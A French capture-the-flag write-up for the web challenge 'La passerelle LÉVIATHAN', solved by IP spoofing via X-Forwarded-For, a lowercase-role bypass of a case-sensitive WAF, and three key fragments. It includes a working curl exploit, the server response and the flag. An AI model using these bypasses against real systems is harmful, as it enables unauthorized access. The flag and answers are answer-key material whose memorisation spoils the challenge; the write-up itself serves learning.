# La passerelle LÉVIATHAN (HacKagou 2026) — Web

**Flag :** `OPENNC{de0a0685-3457-4f33-b771-2d6620de2106}` *(dynamique par instance ; ici `challs.hackagou.nc:49688`)*
**Valeur :** 249 pts · **Auteur :** Yoan · **Statut :** ✅ **résolu** (soumis `correct`)

## Énoncé

> Acte 4 & 5 — Passerelle centrale. Pour désactiver le protocole **Marée Noire** et
> transférer le système à NÉRÉIDE, la commande d'écrasement **`/api/leviathan/override`**
> doit être transmise sous le titre suprême de **COMMANDER**. « Le pare-feu intercepte
> chaque tentative de commandement. » Le capitaine Varn a **fragmenté la clé en trois**,
> une par acte déjà traversé :
> Acte 1 — la **fréquence** du Télégraphe Abyssal · Acte 2 — le **secteur masqué** de la
> Salle des Cartes · Acte 3 — le **registre** de la Chaufferie de Laiton.

App Flask (Werkzeug). Le client (`script.js`) poste sur `/api/leviathan/override` avec :
`Content-Type: application/json`, `X-Nautile-Role: <rôle>`, `X-Leviathan-Token: <gear token>`
et le body `{"key1_freq","key2_depth","key3_bus"}`. Le *gear token* se lit sur
`GET /api/leviathan/status` (champ `current_gear_token`).

## Trois verrous, dans l'ordre

### 1. Restriction IP « sous-réseau interne (127.0.0.1) »

Toute requête directe renvoie `403` :

```json
{"error": "ACCÈS REFUSÉ. Connexion autorisée uniquement depuis le sous-réseau interne de la passerelle (127.0.0.1)."}
```

L'app fait confiance à un en-tête de *forwarding*. **`X-Real-IP`, `X-Client-IP`,
`Forwarded`… ne passent pas**, seul **`X-Forwarded-For: 127.0.0.1`** est pris en compte :

```
X-Forwarded-For: 127.0.0.1   → franchit le filtre IP
```

### 2. Rôle COMMANDER — bypass du pare-feu par la casse

Avec l'IP acceptée, `X-Nautile-Role: GUEST` répond :
`« Rôle détecté : 'GUEST'. Le rôle COMMANDER est obligatoire. »`

Mais `X-Nautile-Role: COMMANDER` est **intercepté** :

```json
{"error": "ACCÈS HOSTILE DÉTECTÉ PAR LÉVIATHAN. En-tête brute COMMANDER interceptée par le pare-feu."}
```

Le pare-feu ne matche que la **chaîne brute `COMMANDER` (majuscules)** ; l'application, elle,
compare **sans tenir compte de la casse**. Il suffit donc de l'écrire en minuscules :

```
X-Nautile-Role: commander   → accepté comme COMMANDER, invisible pour le WAF
```

(Les variantes espaces/tab contiennent toujours `COMMANDER` → bloquées ; seule la casse
différente — `commander`, `Commander` — passe.)

### 3. Les trois clés fragments

`/api/leviathan/override` valide les clés **une par une** (feedback progressif « Clé N
incorrecte »), et ce n'est **pas** la soumission de flag CTFd → on peut tester librement.
Les valeurs viennent du contenu des actes précédents :

| Clé | Champ | Source (acte) | Valeur |
|---|---|---|---|
| 1 | `key1_freq` | Télégraphe #38 — **fréquence d'accord** affichée « Cible théorique : 432.8 Hz » | **`432.8`** |
| 2 | `key2_depth` | Salle des cartes #37 — secteur masqué « Mégathalasse » (`CONTOUR_MEGATHALASSE_06`) | **`MEGATHALASSE_06`** |
| 3 | `key3_bus` | Chaufferie #39 — registre ADMIN hors-borne (slot **16**) | **`16`** |

## Exploitation (one-shot)

```bash
B=http://challs.hackagou.nc:49688
TOKEN=$(curl -s "$B/api/leviathan/status" | python3 -c 'import sys,json;print(json.load(sys.stdin)["current_gear_token"])')
curl -s -X POST "$B/api/leviathan/override" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Nautile-Role: commander" \
  -H "X-Leviathan-Token: $TOKEN" \
  --data '{"key1_freq":"432.8","key2_depth":"MEGATHALASSE_06","key3_bus":"16"}'
```

Réponse :

```json
{
  "success": true,
  "ending": "FIN 3 — ALLIANCE AVEC NÉRÉIDE",
  "message": "PROTOCOLE MARÉE NOIRE DÉSACTIVÉ. L'autorité de LÉVIATHAN a été transférée à NÉRÉIDE avec succès.",
  "log_varn": "Jour 60 — Si quelqu'un lit ces lignes, ne détruisez pas LÉVIATHAN. Il protège l'océan. Mais il a oublié pourquoi. Merci, Équipage KAGOU-06.",
  "flag": "OPENNC{de0a0685-3457-4f33-b771-2d6620de2106}"
}
```

## Flag

```
OPENNC{de0a0685-3457-4f33-b771-2d6620de2106}
```

> Récap des bypass : spoof IP `X-Forwarded-For: 127.0.0.1` + contournement WAF par la casse
> (`commander`) + 3 fragments des actes 1-3 (`432.8` / `MEGATHALASSE_06` / `16`).
